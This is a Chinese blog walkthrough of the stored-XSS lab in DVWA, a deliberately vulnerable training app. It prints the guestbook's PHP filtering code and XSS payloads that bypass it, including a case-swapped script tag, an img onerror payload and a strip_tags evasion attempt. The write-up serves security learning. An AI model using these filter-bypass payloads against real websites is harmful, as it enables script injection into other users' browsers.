&lt;p>但抱怨还是有抱怨的。因为我通关DVWA的目的是学习=。=CSP的 High 难度选择用命令注入当突破口，对了解 CSP 本身就没啥用了，命令注入本身可以干的事情就远不止弄死一个 CSP 这么点=。=&lt;/p>
&lt;p>总之，也行吧。多少对 CSP 有点了解了。&lt;/p></description></item><item><title>DVWA上手记录-存储型XSS</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-11/</link><pubDate>Thu, 28 Apr 2022 17:21:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-11/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>还是很简单。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>没过滤就保存到了数据库里，渲染的时候也没做好过滤。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="收集信息">收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163441737.png"
width="678"
height="315"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163441737_hu3c302ff9bd851d0183412943be0aa03d_19867_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163441737_hu3c302ff9bd851d0183412943be0aa03d_19867_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428163441737"
class="gallery-image"
data-flex-grow="215"
data-flex-basis="516px"
>&lt;/p>
&lt;p>留言板，而且试了下没过滤 &lt;code>&amp;lt;b&amp;gt;&lt;/code>，所以基本和反射型没什么区别，大概。&lt;/p>
&lt;h3 id="low难度">Low难度&lt;/h3>
&lt;p>直接插入一个&lt;code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163539665.png"
width="860"
height="185"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163539665_hu82c12ffd210e1e55ee88d49785a7b96a_7170_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163539665_hu82c12ffd210e1e55ee88d49785a7b96a_7170_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428163539665"
class="gallery-image"
data-flex-grow="464"
data-flex-basis="1115px"
>&lt;/p>
&lt;h3 id="medium难度">Medium难度&lt;/h3>
&lt;p>重置下数据库，再试试直接注入&lt;code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163928089.png"
width="670"
height="313"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163928089_huc6de1d15d68806499a0138d5e708d6fa_19508_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428163928089_huc6de1d15d68806499a0138d5e708d6fa_19508_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428163928089"
class="gallery-image"
data-flex-grow="214"
data-flex-basis="513px"
>&lt;/p>
&lt;p>发现标签没了。看下源码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;btnSign&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;mtxMessage&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;txtName&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Sanitize message input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">strip_tags&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">addslashes&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">htmlspecialchars&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Sanitize name input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;script&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="c1">// Update database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;INSERT INTO guestbook ( comment, name ) VALUES ( &amp;#39;&lt;/span>&lt;span class="si">$message&lt;/span>&lt;span class="s2">&amp;#39;, &amp;#39;&lt;/span>&lt;span class="si">$name&lt;/span>&lt;span class="s2">&amp;#39; );&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">//mysql_close();
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>注意&lt;code>sanitize message input&lt;/code>和&lt;code>sanitize name input&lt;/code>，使用了两种不同的方法替换掉&lt;code>script&lt;/code>标签。一个是&lt;code>strip_tags&lt;/code>一个是&lt;code>str_replace&lt;/code>。显然&lt;code>str_replace&lt;/code>是更弱的方法，我们先过掉&lt;code>str_replace&lt;/code>。payload 只需要改一下大小写：&lt;code>&amp;lt;sCript&amp;gt;alert(1)&amp;lt;/sCript&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164406647.png"
width="495"
height="162"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164406647_hu4eed0464b9fbe29bc03a94ed4f9d1725_6877_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164406647_hu4eed0464b9fbe29bc03a94ed4f9d1725_6877_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428164406647"
class="gallery-image"
data-flex-grow="305"
data-flex-basis="733px"
>&lt;/p>
&lt;p>但是尴尬地发现这个 &lt;code>input&lt;/code> 标签限制了长度，直接改 HTML 解决。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164457027.png"
width="547"
height="193"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164457027_hudc35b59fc9ba85cf3558e5f8f3bb4e73_18210_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164457027_hudc35b59fc9ba85cf3558e5f8f3bb4e73_18210_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428164457027"
class="gallery-image"
data-flex-grow="283"
data-flex-basis="680px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164501682.png"
width="796"
height="184"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164501682_hud5750180c75a01dae4b7900e31fb3984_6255_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164501682_hud5750180c75a01dae4b7900e31fb3984_6255_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428164501682"
class="gallery-image"
data-flex-grow="432"
data-flex-basis="1038px"
>&lt;/p>
&lt;p>好的，成功过了一个。重置数据库后再尝试 bypass 掉 &lt;code>strip_tags&lt;/code>。&lt;/p>
&lt;p>函数文档提到：&lt;/p>
&lt;blockquote>
&lt;p>Self-closing XHTML tags are ignored and only non-self-closing tags should be used in &lt;code>allowed_tags&lt;/code>.&lt;/p>
&lt;/blockquote>
&lt;p>而且&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Warning&lt;/strong>&lt;/p>
&lt;p>This function should not be used to try to prevent XSS attacks. Use more appropriate functions like &lt;a class="link" href="https://www.php.net/manual/en/function.htmlspecialchars.php" target="_blank" rel="noopener"
>htmlspecialchars()&lt;/a> or other means depending on the context of the output.&lt;/p>
&lt;/blockquote>
&lt;p>所以可以肯定 &lt;code>strip_tags&lt;/code> 是挡不住 XSS 的。文档提到会忽略 &lt;code>self-closing XHTML tags&lt;/code>，所以用 &lt;code>img&lt;/code> 标签试一下。payload改成：&lt;code>&amp;lt;img src=&amp;quot;&amp;quot; onerror=alert(1)/&amp;gt;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164835457.png"
width="339"
height="51"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164835457_hu0ee66bc511c74093719e818fd3334056_1828_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428164835457_hu0ee66bc511c74093719e818fd3334056_1828_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428164835457"
class="gallery-image"
data-flex-grow="664"
data-flex-basis="1595px"
>&lt;/p>
&lt;p>失败。直接谷歌一下怎么 bypass &lt;code>strip_tags&lt;/code>。&lt;a class="link" href="https://stackoverflow.com/questions/5788527/is-strip-tags-vulnerable-to-scripting-attacks" target="_blank" rel="noopener"
>这个链接&lt;/a>解释了&lt;code>strip_tags&lt;/code>的实现为什么不能防御 XSS ，另一个回答提供了一个 payload：&lt;code>&amp;lt;&amp;lt;a&amp;gt;script&amp;gt;alert(XSS);&amp;lt;&amp;lt;/a&amp;gt;/script&amp;gt;&lt;/code>。直接试一试。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428165138291.png"
width="361"
height="155"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428165138291_hu7922ed0f8371cf771a421a018ff9de80_6277_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-11/image-20220428165138291_hu7922ed0f8371cf771a421a018ff9de80_6277_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428165138291"
class="gallery-image"
data-flex-grow="232"
data-flex-basis="558px"
>&lt;/p>
&lt;p>好的，证明并不靠谱。注意到php代码里还做了&lt;code>addslashes&lt;/code>，保护比较好了，干脆放弃。继续做 High 难度。&lt;/p>
&lt;h3 id="high难度">High难度&lt;/h3>
&lt;p>看代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;btnSign&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;mtxMessage&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;txtName&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Sanitize message input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">strip_tags&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">addslashes&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="nv">$message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">htmlspecialchars&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$message&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Sanitize name input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">preg_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;/&amp;lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="c1">// Update database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;INSERT INTO guestbook ( comment, name ) VALUES ( &amp;#39;&lt;/span>&lt;span class="si">$message&lt;/span>&lt;span class="s2">&amp;#39;, &amp;#39;&lt;/span>&lt;span class="si">$name&lt;/span>&lt;span class="s2">&amp;#39; );&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">//mysql_close();
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>老样子，直接用&lt;code>img&lt;/code>的payload就可以过，不多写了。&lt;/p>
&lt;h3 id="strip_tags">strip_tags&lt;/h3>
&lt;p>现在回头研究下 &lt;code>strip_tags&lt;/code> 这个函数要怎么 bypass 。首先链接里的问题是11年前提出（大约是2011年）的，提问时的PHP版本是 5.3（见提问者给的链接），所以在 5.x 版本可能 &lt;code>strip_tags&lt;/code> 确实会被 &lt;code>&amp;lt;&amp;lt;a&amp;gt;script&amp;gt;alert(XSS);&amp;lt;&amp;lt;/a&amp;gt;/script&amp;gt;&lt;/code> 给绕过。但我的DVWA配的环境是 PHP 7 + MySQL 5.7，所以这个问答里给出的 payload 可能是 PHP 7 已经修复了故而没用。&lt;/p>
&lt;p>从 Teh playground 测试的结果看新实现可能是栈方式了，就是&lt;code>&amp;lt;&lt;/code>计数+1，后面的全都删掉。因为&lt;code>&amp;lt;&lt;/code>一定被x，最多只能留下&lt;code>&amp;gt;&lt;/code>，想在 &lt;code>strip_tags&lt;/code> 里留下标签大概是做不到了。&lt;/p>
&lt;p>看下帮助手册，也是提到用&lt;code>name&lt;/code>字段而不是&lt;code>message&lt;/code>字段。现在是没辙了。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>最大的困难是&lt;code>strip_tags&lt;/code>，这要放比赛里我就是个寄吧。&lt;/p>
